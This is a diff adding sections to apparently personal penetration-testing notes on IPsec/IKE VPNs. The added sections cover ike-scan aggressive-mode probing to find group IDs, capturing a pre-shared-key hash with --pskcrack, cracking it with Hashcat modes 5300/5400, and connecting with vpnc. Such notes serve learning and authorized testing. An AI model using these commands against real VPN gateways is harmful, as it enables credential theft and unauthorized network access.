@@ -68,6 +68,12 @@ ike-scan -M --showbackoff [ip]
 or with [[Nmap]] script `ike-version`
 
 ### Finding the correct ID (group name)
+When doing an `ike-scan`, if Vendor IDs and XAUTH show up, we might be able to try aggressive mode to see if any service leaked identity or PSK material show up:
+```bash
+ike-scan -A -P psk.txt [ip]
+```
+> from here we may be able to get the ID
+
 To be able to capture a hash we need to use the valid transformation supporting aggressive mode and the correct ID (group name). We will likely have to brute-force the group name.
 ```bash
 ike-scan -P -M -A -n fakeID [ip]
@@ -83,3 +89,26 @@ while read line; do (echo "Found ID: $line" && sudo ike-scan -M -A -n $line <IP>
 Alternatively, we can try:
 - [iker.py](https://github.com/isaudits/scripts/blob/master/iker.py) which uses `ike-scan` but follows its own method to find a valid ID based on the output of ike-scan
 - [ikeforce.py](https://github.com/SpiderLabs/ikeforce) which will try to use different exploits to distinguish between valid and non-valid IDs (can have false positives/negatives)
+
+### Capturing the Hash
+If we have a valid transformation and the group name and aggressive mode is enable, we can grab the hash:
+```bash
+ike-scan -M -A -n <ID> --pskcrack=hash.txt <IP> #If aggressive mode is supported and you know the id, you can get the hash of the password
+```
+this can then be cracked as a normal hash with [[Hashcat]] mode - MD5 : 5300 - SHA1 : 5400
+
+### Connecting to an IPSec VPN
+In Kali, we use `VPNC` so we need this connection file in `/etc/vpnc/[filename].conf`
+```
+IPSec gateway [VPN_GATEWAY_IP]
+IPSec ID [VPN_CONNECTION_ID]
+IPSec secret [VPN_GROUP_SECRET]
+IKE Authmode psk 
+Xauth username [VPN_USERNAME]
+Xauth password [VPN_PASSWORD]
+```
+Then we can use:
+```bash
+vpnc [filename]
+```
+This will start it in the background and connect us to the VPN.
